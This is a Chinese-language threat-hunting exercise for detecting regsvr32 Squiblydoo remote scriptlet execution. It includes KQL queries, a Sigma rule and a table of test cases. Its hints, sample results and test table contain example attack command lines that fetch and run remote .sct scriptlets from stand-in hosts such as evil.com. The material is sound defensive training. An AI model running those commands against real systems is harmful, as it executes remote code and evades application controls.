# 練習 D — Hypothesis-Driven 狩獵：regsvr32 Squiblydoo

> 目標：從一個 ATT&CK TTP 出發，完整走過 hypothesis-driven hunt 的全流程：形成假設 → 定義資料需求 → 寫查詢找候選 → 用 stacking 排除正常 → 確認 → 轉成一條 Sigma 偵測規則。

## 背景動機

你接到 TI 團隊的通知：最近幾個月，有多個 threat actor 組織在使用 **Squiblydoo**（T1218.010）手法——呼叫 `regsvr32.exe` 並傳入 `/s /i:` 參數，讓它直接從外部 URL 載入 COM scriptlet（`.sct` 檔），藉此繞過 AppLocker 和 AV 簽名偵測。

你的任務是：**在過去 30 天的環境資料裡，主動確認這個手法有無發生**，並且不管有無發現，都要輸出一條 Sigma 規則讓這個 TTP 未來能被自動偵測。

這個練習有四個步驟，**每個步驟都要你自己先動手，才能看提示或解答**。

---

## 任務規格

### 給定假設

> 「攻擊者使用 `regsvr32.exe` 搭配 `/s /i:` 和遠端 URL 或 UNC 路徑，載入 COM scriptlet（scrobj.dll），繞過 AppLocker 並執行惡意程式碼。」
>
> MITRE ATT&CK：T1218.010（System Binary Proxy Execution: Regsvr32）

### 你需要輸出的東西

1. 資料需求分析：你需要哪些 Event Source、哪些欄位
2. 狩獵查詢：KQL 或 SPL，找到候選事件
3. Stacking 查詢：用統計方法排除正常的 regsvr32 使用
4. 一條完整的 Sigma 規則，能讓其他 SIEM 複用這個偵測邏輯

---

## 實作步驟建議

### Step 1：把假設拆成資料需求

拿出紙或文字檔，回答這些問題：

- 這個手法涉及哪個程序？它的命令列特徵是什麼？
- 攻擊者如果載入遠端 scriptlet，在 Sysmon 裡會產生哪幾種 Event？（至少想到 3 種）
- 除了 endpoint，網路層有什麼可以補強？哪個 Event 能看到 regsvr32 發起的 HTTP 連線？
- 你需要的關鍵欄位是哪些？（程序名、命令列、父程序、目標 IP、載入的 DLL 名稱）

在寫查詢之前，先完成這個分析。

<details>
<summary>卡住了？看提示</summary>

Squiblydoo 的行為鏈：

```
某程序（parent）
  └── regsvr32.exe /s /i:http://evil.com/payload.sct scrobj.dll
        ├── 發起 HTTP 連線到外部（Sysmon Event 3）
        ├── 載入 scrobj.dll（Sysmon Event 7）
        └── 可能生出子程序執行 scriptlet 裡的 payload（Sysmon Event 1）
```

你需要的 Event：
- **Sysmon Event 1**（Process Create）：`regsvr32.exe` 的命令列，以及它的父程序
- **Sysmon Event 3**（Network Connection）：`regsvr32.exe` 發起的外部網路連線
- **Sysmon Event 7**（Image Loaded）：`scrobj.dll` 被 `regsvr32.exe` 載入

關鍵欄位：Image、CommandLine、ParentImage、DestinationIp、DestinationPort、ImageLoaded

</details>

---

### Step 2：寫狩獵查詢

用 KQL 或 SPL 寫出你的候選查詢。目標是**召回率優先**（寧可多查出一些正常的，也不要漏掉惡意的），之後再用 stacking 縮小。

你應該寫出兩個查詢：

**查詢 A**：從 Sysmon Event 1 找含有可疑參數的 `regsvr32.exe` 執行

**查詢 B**：從 Sysmon Event 3 找 `regsvr32.exe` 發起的外部網路連線

<details>
<summary>卡住了？看提示</summary>

思考命令列的特徵：

正常的 `regsvr32.exe` 用法：
```
regsvr32.exe shell32.dll
regsvr32.exe /s /u C:\Program Files\SomeApp\com.dll
```

Squiblydoo 的用法：
```
regsvr32.exe /s /i:http://attacker.com/payload.sct scrobj.dll
regsvr32.exe /s /i:http://attacker.com/payload.sct:AAAA scrobj.dll
regsvr32.exe /s /i:\\attacker.com\share\payload.sct scrobj.dll
```

特徵：
- 命令列含有 `/i:` 後接 `http://`、`https://`、`ftp://` 或 `\\`（UNC 路徑）
- 命令列含有 `scrobj` 或 `scriptlet`

</details>

---

### Step 3：用 Stacking 排除正常

在 Step 2 的基礎上，你可能會查到很多 `regsvr32.exe` 的執行記錄（IT 部門用它安裝 COM 元件是完全合法的）。用 stacking 的方式：

1. 統計 `regsvr32.exe` 的親程序（Parent Process）分布
2. 統計 `regsvr32.exe` 的 commandline 特徵分布
3. 找出低頻（count < 5）的組合

你要回答：**什麼樣的 regsvr32 執行情境是這個環境裡的「長尾」？**

<details>
<summary>卡住了？看提示</summary>

一個好的 stacking 查詢模板（KQL）：

```kql
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "regsvr32.exe"
| summarize
    count(),
    sample_cmdlines = make_set(ProcessCommandLine, 5)  // 最多取 5 個範例
  by ParentProcess = InitiatingProcessFileName
| order by count_ asc
```

低頻的親程序值得重點調查：
- `mshta.exe` 生 `regsvr32.exe` → 可疑，典型的多段 dropper 鏈
- `winword.exe` 生 `regsvr32.exe` → 可疑，Office 巨集 dropper
- `explorer.exe` 生 `regsvr32.exe` → 可能正常（使用者直接雙擊 regsvr32），但仍要看命令列
- `msiexec.exe` 生 `regsvr32.exe` → 安裝程式行為，通常正常

</details>

---

### Step 4：寫 Sigma 偵測規則

把你的 hunting 邏輯轉成一條 Sigma 規則。Sigma 格式是 YAML，目標是讓這條規則能被 `sigmac` 或 `sigma-cli` 轉換成任何 SIEM 的查詢語言。

Sigma 規則基本結構：

```yaml
title: 規則標題
id: <UUID>           # 唯一識別，可以用 uuidgen 產生
status: experimental
description: 描述
references:
  - ATT&CK 連結
author: 你的名字
date: 2026-08-01
tags:
  - attack.t1218.010
  - attack.defense_evasion
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    # 你的偵測條件
  condition: selection
falsepositives:
  - 合法的 COM scriptlet 安裝（列出已知例外）
level: high
```

填入你自己在 Step 2-3 找到的偵測邏輯。

<details>
<summary>卡住了？看提示</summary>

偵測條件應該涵蓋：

1. `Image` 欄位：`regsvr32.exe`（結尾或完整路徑）
2. `CommandLine` 欄位：含有 `/i:` 且後接 URL scheme（`http://`、`https://`、`ftp://`）或 UNC 路徑（`\\`）
3. 可選加強：`CommandLine` 含有 `scrobj`

你可以用 `|contains|all` 來要求多個條件同時出現：

```yaml
selection:
  Image|endswith: '\regsvr32.exe'
  CommandLine|contains:
    - '/i:http'
    - '/i:https'
    - '/i:ftp'
    - '/i:\\'
```

</details>

---

## 期望輸出範例

### Step 1 輸出範例

```
假設拆解：
- 程序：regsvr32.exe
- 命令列特徵：含 /s /i: 且後接遠端 URL 或 UNC 路徑，結尾通常有 scrobj.dll
- 涉及的 Sysmon Event：
  * Event 1：regsvr32 的 process create，含命令列
  * Event 3：regsvr32 發起的出站網路連線
  * Event 7：scrobj.dll 被載入到 regsvr32 的進程空間
- 關鍵欄位：Image, CommandLine, ParentImage, DestinationIp, DestinationPort, ImageLoaded
```

### Step 2 輸出範例（查詢 A）

```kql
// KQL - 找含可疑參數的 regsvr32（示意）
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "regsvr32.exe"
| where ProcessCommandLine has_any (
    "/i:http://",
    "/i:https://",
    "/i:ftp://",
    "/i:\\\\"     // UNC 路徑
  )
| project Timestamp, DeviceName, AccountName,
          ProcessCommandLine,
          ParentProcess = InitiatingProcessFileName
| order by Timestamp desc
// 結果（示意）：回傳所有符合條件的 regsvr32 執行記錄
```

```kql
// 查詢 B - 找 regsvr32 的出站網路連線（示意）
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "regsvr32.exe"
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, AccountName,
          RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessCommandLine
| order by Timestamp desc
```

### Step 3 輸出範例（Stacking）

```kql
// Stacking：regsvr32 的親程序分布（示意）
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "regsvr32.exe"
| summarize
    count(),
    sample_cmdlines = make_set(ProcessCommandLine, 3)
  by ParentProcess = tolower(InitiatingProcessFileName)
| order by count_ asc

// 示意結果：
// mshta.exe         → count: 1   sample: regsvr32.exe /s /i:http://evil.com/p.sct scrobj.dll
// winword.exe       → count: 2   sample: regsvr32.exe /s /i:https://cdn.evil.com/run.sct
// explorer.exe      → count: 15  sample: regsvr32.exe /s C:\Program Files\App\helper.dll
// msiexec.exe       → count: 342 sample: regsvr32.exe /s /u SomeComponent.dll
```

從 stacking 結果確認：`mshta.exe` 和 `winword.exe` 生出的 `regsvr32.exe` 執行，且命令列含遠端 URL，是真正可疑的候選。

### Step 4 輸出範例（Sigma 規則）

```yaml
title: Regsvr32 Squiblydoo Remote Scriptlet Execution
id: 8d5e1f3a-2c4b-4e8f-9a1d-7b6c3e2a5f0d
status: experimental
description: |
  偵測 regsvr32.exe 使用 /i: 參數載入遠端 COM scriptlet（Squiblydoo 技術）。
  攻擊者使用此手法繞過 AppLocker 和 AV 簽名偵測。
  T1218.010 - System Binary Proxy Execution: Regsvr32
references:
  - https://attack.mitre.org/techniques/T1218/010/
  - https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
author: blue_team_practitioner
date: 2026-08-01
tags:
  - attack.defense_evasion
  - attack.t1218.010
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith: '\regsvr32.exe'
  selection_remote:
    CommandLine|contains:
      - '/i:http://'
      - '/i:https://'
      - '/i:ftp://'
      - '/i:\\\\'     # UNC path
  condition: selection_image and selection_remote
falsepositives:
  - 企業 MDM 或部署工具透過 UNC 路徑安裝 COM 元件（需建立環境白名單）
  - 某些舊式 enterprise 應用程式使用 COM scriptlet 安裝
level: high
```

---

## 測試用例表

| 命令列 | 應觸發？| 理由 |
|---|---|---|
| `regsvr32.exe /s /i:http://evil.com/run.sct scrobj.dll` | ✅ 是 | 遠端 HTTP scriptlet |
| `regsvr32.exe /s /i:https://cdn.attacker.com/p.sct scrobj.dll` | ✅ 是 | 遠端 HTTPS scriptlet |
| `regsvr32.exe /s /i:\\192.168.1.100\share\payload.sct scrobj.dll` | ✅ 是 | UNC 路徑 scriptlet |
| `regsvr32.exe /s /u SomeApp.dll` | ❌ 否 | 正常的 DLL 反註冊，無 /i: |
| `regsvr32.exe /s C:\Program Files\App\helper.dll` | ❌ 否 | 正常本地 DLL 安裝 |
| `regsvr32.exe /s /i:C:\Local\setup.sct scrobj.dll` | ❌ 否 | 本地 scriptlet，不是遠端（這條是否需要另一個規則值得思考）|

**思考題**：上表最後一條（本地 scriptlet）在你的 Sigma 規則裡不會觸發，但它在某些攻擊場景（先把 scriptlet 落地再執行）仍然可疑。你會如何修改規則來涵蓋這個案例，同時控制 false positive？

---

## 延伸挑戰

1. **補強網路層規則**：把你的 Sigma 規則改成關聯兩個 Event Source（process_creation + dns_query 或 network_connection），讓它在「regsvr32 執行且有對應網路連線」時才觸發，降低 false positive。

2. **涵蓋混淆變形**：攻擊者可能把 `/i:` 寫成 `/ i:` 或用不同大小寫（`/I:`）。Sigma 的 `CommandLine|contains` 預設是 case-insensitive 嗎？（提示：取決於 logsource 的 backend）試著讓你的規則對大小寫變形也能偵測。

3. **追蹤子程序**：Squiblydoo 的 scriptlet 執行後可能會生出子程序。補寫一條 Sigma 規則，偵測「父程序是 regsvr32.exe 且子程序是可疑的命令執行程序（powershell.exe / cmd.exe / wscript.exe）」。

4. **完整 hunt playbook**：把 Step 1-4 寫成一份 markdown 格式的 hunt playbook，包含：假設、資料需求、查詢、如何解讀結果、如何升級到 IR、以及輸出的 Sigma 規則。這就是你工作中實際要產出的文件。

5. **使用 Sigma CLI 驗證**：如果你有安裝 `sigma-cli`，用 `sigma convert -t splunk` 或 `sigma convert -t lucene` 把你的規則轉換成 SIEM 查詢，檢查輸出語法是否正確。

---

## 自我檢核

做完這個練習，你應該能回答：

- [ ] 給我一個 ATT&CK TTP，我能系統性地把它拆成資料需求（Event Source、關鍵欄位、查詢條件）
- [ ] 我能解釋為什麼「先寬後窄」（先高召回率查詢，再用 stacking 縮小）是 hunting 的標準流程
- [ ] 我能說出 stacking 找到「低頻親程序」的哪些結果值得調查，以及判斷依據
- [ ] 我的 Sigma 規則包含了 title、id、logsource、detection、falsepositives、level 這些必要欄位
- [ ] 我能說出這個偵測邏輯的侷限——攻擊者可以怎麼修改手法繞過它

---

→ [Ch 31 惡意程式鑑識分類與行為分析](./31-malware-forensics-triage.md)
